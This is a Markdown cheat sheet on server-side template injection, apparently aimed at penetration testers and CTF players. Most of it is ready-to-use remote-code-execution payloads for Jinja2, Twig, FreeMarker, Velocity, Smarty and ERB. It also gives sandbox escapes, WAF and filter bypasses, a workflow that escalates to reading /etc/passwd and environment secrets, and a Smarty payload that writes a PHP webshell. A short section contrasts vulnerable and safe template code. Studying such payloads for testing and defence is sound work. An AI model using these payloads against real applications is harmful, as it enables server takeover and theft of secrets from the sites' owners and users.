# Server-Side Template Injection (SSTI) - Basics

## Quick Reference

| Engine | Language | Detection | RCE Payload |
|--------|----------|-----------|-------------|
| Jinja2 | Python | `{{7*'7'}}` → `7777777` | `{{cycler.__init__.__globals__.os.popen('id').read()}}` |
| Twig | PHP | `{{7*'7'}}` → `7777777` | `{{['id']\|filter('system')}}` |
| FreeMarker | Java | `${7*7}` → `49` | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| Velocity | Java | `#set($x=7*7)$x` → `49` | `#set($rt=$class.forName('java.lang.Runtime').getRuntime())` |
| Smarty | PHP | `{7*7}` → `49` | `{system('id')}` |
| ERB | Ruby | `<%= 7*7 %>` → `49` | `<%= system('id') %>` |

**Quick Detection Probes:**
```
{{7*7}}        → Jinja2 / Twig / Handlebars
${7*7}         → FreeMarker / EJS
<%= 7*7 %>     → ERB
#set($x=7*7)$x → Velocity
{7*7}          → Smarty
```

---

## What is SSTI?

Server-Side Template Injection occurs when user input is embedded into a template string **before** rendering, allowing attackers to inject template directives and execute arbitrary code on the server.

**Impact:**
- 🔓 Remote Code Execution (RCE) on the server
- 📂 Read arbitrary files (e.g., `/etc/passwd`, `/flag.txt`)
- 🔑 Access internal app config, secrets, and env variables
- 💀 Full server compromise

**Vulnerable vs Safe:**
```python
# ✅ SAFE — user input passed as context variable
template = "Hello {{username}}"
render(template, {"username": user_input})

# ❌ VULNERABLE — user input embedded into the template string
template = f"Hello {user_input}"
render(template)
# Input: {{7*7}} → Output: Hello 49
```

---

## Detection Methodology

### Step 1: Probe with Math Expressions
Send these payloads in every user-controlled input field:
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
#set($x=7*7)$x
```
- **Vulnerable:** response contains `49`
- **Not vulnerable:** literal string echoed back

### Step 2: Fingerprint the Engine
Use the multiplication trick — different engines handle `7*'7'` differently:
```
{{7*'7'}}
```
- **Jinja2 / Twig / Mako:** `7777777`
- **Others:** `49` or error

### Step 3: Polyglot Payload
Test multiple engines in a single shot:
```
${{<%[%'"}}%\
{{7*7}}
${7*7}
<%= 7*7 %>
```

### Step 4: Common Injection Points
- 🔴 **URL params:** `GET /page?name={{7*7}}`
- 🔴 **POST body:** `name={{7*7}}&email=test@test.com`
- 🔴 **HTTP headers:** `User-Agent: {{7*7}}`
- 🔴 **Form fields, email templates, error messages**

---

## Jinja2 Exploitation (Python / Flask)

**Detection:**
```python
{{7*7}}      → 49
{{7*'7'}}    → 7777777
```

**RCE — Method 1 (builtins import):**
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

**RCE — Method 2 (config globals):**
```python
{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
```

**RCE — Method 3 (cycler — clean & short):**
```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

**RCE — Method 4 (lipsum):**
```python
{{ lipsum.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

**File Read:**
```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

**Info Dump:**
```python
{{ config }}
{{ config.items() }}
{{ self.__dict__ }}
```

---

## Twig Exploitation (PHP / Symfony)

**Detection:**
```
{{7*7}}    → 49
{{7*'7'}}  → 7777777
```

**RCE:**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}

{{['id']|filter('system')}}

{{['cat /etc/passwd']|filter('system')}}
```

**Info Dump:**
```php
{{ dump(app) }}
{{ dump(_self) }}
```

---

## FreeMarker & Velocity Exploitation (Java)

**FreeMarker Detection:** `${7*7}` → `49`

**FreeMarker RCE:**
```java
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }

<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat /etc/passwd") }

<#assign classloader=object?api.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.utility.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

**Velocity Detection:** `#set($x=7*7)$x` → `49`

**Velocity RCE:**
```java
#set($runtime = $class.forName('java.lang.Runtime').getRuntime())
#set($process = $runtime.exec('id'))
$process.waitFor()
#set($null=$process.getInputStream())
#foreach($i in [1..$null.available()])
$null.read()
#end
```

---

## Smarty & ERB Exploitation

**Smarty (PHP) Detection:** `{7*7}` → `49`

**Smarty RCE:**
```php
{system('id')}
{php}system('id');{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['c']); ?>",self::clearConfig())}
```

**ERB (Ruby) Detection:** `<%= 7*7 %>` → `49`

**ERB RCE:**
```ruby
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
<%= File.open('/etc/passwd').read %>
```

---

## Jinja2 Sandbox Escapes & Filter Bypasses

**Sandbox Escape — Object Introspection:**
```python
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

**Sandbox Escape — via request object:**
```python
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

**Bypass `{{` and `}}`:**
```python
{%print(7*7)%}
{% print 7*7 %}
{%set x=7*7%}{{x}}
```

**Bypass Quotes:**
```python
{{request.args.x}}          # Pass x=command via GET
{{''[request.args.x]}}      # x=__class__
```

**Bypass Dots:**
```python
{{''['__class__']}}
{{''|attr('__class__')}}
```

**Bypass Underscores:**
```python
{{''['\x5f\x5fclass\x5f\x5f']}}
{{request.args.x}}           # x=__class__
```

**Bypass Keywords (import, os, etc.):**
```python
{{"__im"+"port__"}}
{{"o"+"s"}}
{{request.args.cmd}}         # cmd=import
```

---

## Exploitation Workflow

**Step 1:** Identify all user-controlled input points (GET/POST params, headers, cookies, form fields).

**Step 2:** Inject basic math probes — `{{7*7}}`, `${7*7}}`, `<%= 7*7 %>` — and observe if `49` appears in the response.

**Step 3:** Use `{{7*'7'}}` to distinguish Jinja2/Twig (`7777777`) from other engines (`49` or error).

**Step 4:** Try to access Python/PHP/Java objects. If errors reveal stack traces, they confirm the engine and version.

**Step 5:** Use engine-specific RCE payloads. Start with `id` or `whoami` to confirm code execution.

**Step 6:** Escalate — read `/etc/passwd`, `/flag.txt`, env variables, or drop a webshell.

---

## Common Vulnerable Patterns

**Pattern 1 — Python f-string in render:**
```python
# ❌ Vulnerable
template = f"Hello {request.args.get('name')}"
return render_template_string(template)

# ✅ Safe
return render_template_string("Hello {{name}}", name=request.args.get('name'))
```

**Pattern 2 — PHP string concatenation into Twig:**
```php
// ❌ Vulnerable
$template = "Hello " . $_GET['name'];
echo $twig->createTemplate($template)->render([]);

// ✅ Safe
echo $twig->render("Hello {{ name }}", ['name' => $_GET['name']]);
```

**Pattern 3 — Java FreeMarker with raw input:**
```java
// ❌ Vulnerable
String template = "Hello " + userInput;
new Template("t", template, cfg).process(data, out);
```

**Pattern 4 — Ruby ERB with direct interpolation:**
```ruby
# ❌ Vulnerable
template = ERB.new("Hello #{params[:name]}")
template.result(binding)
```

---

## CTF / Practical Tips

**Quick Tests — try these first:**
```python
{{7*7}}
{{7*'7'}}
{{config}}
{{self}}
```

**Flag File Reads:**
```python
# Jinja2
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/flag.txt').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}

# ERB
<%= File.open('/flag.txt').read %>

# Twig
{{['cat /flag.txt']|filter('system')}}
```

**Check Environment Variables:**
```python
# Jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').environ }}

# ERB
<%= ENV %>
```

**List Files First:**
```python
# Jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la /').read() }}
```

**Common CTF Scenarios:**
- ⚠️ Flag is in `/flag.txt`, `/flag`, or `/root/flag.txt`
- ⚠️ Flag stored as an env variable — always check `os.environ`
- ⚠️ WAF filtering `{{` — try `{%print(...)%}` or URL-encode brackets
- ⚠️ Underscores filtered — use `\x5f` hex encoding or `request.args`
- ⚠️ Index offsets for `__subclasses__()` change per Python version — iterate or search

**Tools:**
- **tplmap** — automated SSTI scanner and exploiter
- **SSTImap** — modern alternative to tplmap
- **Burp Suite Intruder** — fuzz all input points with polyglot payloads
- **PayloadsAllTheThings** — comprehensive SSTI payload collection

---

## Key Takeaways

✅ SSTI occurs when user input is **concatenated into** a template string, not passed as a variable context.

✅ Always probe with `{{7*7}}` first — if you see `49`, the app is likely vulnerable.

✅ Use `{{7*'7'}}` to distinguish Jinja2/Twig (`7777777`) from other engines.

✅ Jinja2's `cycler` and `lipsum` globals are the cleanest RCE vectors — short and reliable.

✅ When filters block special chars, use `request.args` to pass payloads out-of-band and bypass WAFs.